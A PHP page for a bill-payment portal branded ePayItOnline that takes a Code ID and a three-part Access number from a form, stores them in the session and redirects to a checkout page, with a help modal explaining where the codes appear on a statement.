<?php
session_start();
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Store first form data in session variables
    $_SESSION['code_id'] = isset($_POST['code_id']) ? $_POST['code_id'] : '';
    $_SESSION['access_1'] = isset($_POST['access_1']) ? $_POST['access_1'] : '';
    $_SESSION['access_2'] = isset($_POST['access_2']) ? $_POST['access_2'] : '';
    $_SESSION['access_3'] = isset($_POST['access_3']) ? $_POST['access_3'] : '';
    header("Location: checkout.php");
    exit();
}
?>

<?php include 'include/header.php'; ?>
<?php include 'include/navigation2.php'; ?>

<!-- Payment One -->
<section class="paymentOne" style="background-image: url('images/bg/3.jpg');">
    <div class="container">
        <div class="row">
            <div class="col-12">
                <div class="boxOne">
                    <div class="logo">
                        <img src="images/logo.png" alt="">
                    </div>
                    <div class="sectionTitle">
                        <h5>Welcome to ePayItOnline® Payment Portal</h5>
                        <p>
                            Please enter the <code>Code ID</code> and <code>Access #</code> provided on your statement:
                        </p>
                    </div>
                    <form method="POST">
                        <div class="row gap-y1">
                            <div class="col-12">
                                <div class="form-group formInline">
                                    <label for="">Code ID</label>
                                    <div class="inputs">
                                        <input type="text" class="form-control" name="code_id" id="code_id"
                                            maxlength="12" required>
                                    </div>
                                </div>
                            </div>
                            <div class="col-12">
                                <div class="form-group formInline">
                                    <label for="">Access #</label>
                                    <div class="inputs">
                                        <input type="text" class="form-control numOnly" name="access_1" id="access_1"
                                            maxlength="10" required>
                                        <span>-</span>
                                        <input type="text" class="form-control numOnly" name="access_2" id="access_2"
                                            maxlength="5" required>
                                        <span>-</span>
                                        <input type="text" class="form-control numOnly" name="access_3" id="access_3"
                                            maxlength="10" required>
                                    </div>
                                </div>
                            </div>
                            <div class="col-12 text-end">
                                <input type="submit" class="btn btnSecondary" value="PAY BILL">
                            </div>
                        </div>
                    </form>
                    <div class="mt-5 text-center">
                        <a href="#codeModal" data-bs-toggle="modal" data-bs-target="#codeModal">
                            Need help finding the Code ID and Access #?
                        </a>
                    </div>
                </div>
            </div>
        </div>
    </div>
</section>

<!-- Modal -->
<div class="modal fade codeModal" id="codeModal" tabindex="-1" aria-labelledby="codeModalLabel" aria-hidden="true">
    <div class="modal-dialog modal-dialog-centered modal-lg">
        <div class="modal-content">
            <div class="modal-header">
                <h5 class="modal-title" id="codeModalLabel">Finding your Code ID and Access #</h5>
                <p>
                    The <code>Code ID</code> and <code>Access #</code> are located on your Statement at a location
                    similar to the image below.
                </p>
                <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
            </div>
            <div class="modal-body">
                <img src="images/code.png" alt="">
            </div>
        </div>
    </div>
</div>

<?php include 'include/copyright2.php'; ?>
<?php include 'include/footer.php'; ?>